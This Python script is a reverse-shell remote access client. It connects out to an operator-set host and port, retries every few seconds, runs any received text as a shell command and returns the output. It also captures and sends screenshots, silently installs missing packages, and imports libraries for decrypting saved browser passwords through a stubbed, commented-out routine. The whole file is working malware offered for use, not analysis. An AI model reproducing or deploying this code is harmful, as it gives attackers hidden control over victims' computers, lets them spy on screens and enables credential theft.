
import socket
import subprocess
import os
import time
try:
    from PIL import Image
    import pyautogui
    import json
    import base64
    import sqlite3
    import shutil
    from datetime import datetime, timedelta
    import win32crypt # pip install pypiwin32
    from Crypto.Cipher import AES # pip install pycryptodome

except:
    subprocess.run("pip install pyautogui pillow pycryptodome pypiwin32 ")
    

s = socket.socket()
host = "127.0.0.1" # your host
port = 7788    # your port

commands = ["screenshot","help"]




while True:
    try:
        s.connect((host,port))

        TEMP_PATH = str(os.getenv("TEMP")) 


        def screen_shot():
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(TEMP_PATH, "screenshot.png")
            screenshot.save(screenshot_path)


            with open(screenshot_path, "rb") as f:
                s.sendall(f.read())


        while True:
            data = s.recv(1024)
            if data[2:].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))

            if data[:10].decode("utf-8") == "screenshot":
                try:
                    screen_shot()
                except:
                    s.send(str.encode("Error Happened during taking screenshot"))
                continue
            # if data[:len("browserpass")].decode("utf-8") == "browserpass":
            #     get_browser_passwords()
                
            if len(data) > 0 and data[:].decode("utf-8") not in commands :

                cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                current_dir = os.getcwd() + " "
                s.send(str.encode(output_str + current_dir + " ⦒ "))
    except: 
        # print("failed to connect to server")
        time.sleep(3)
        continue

    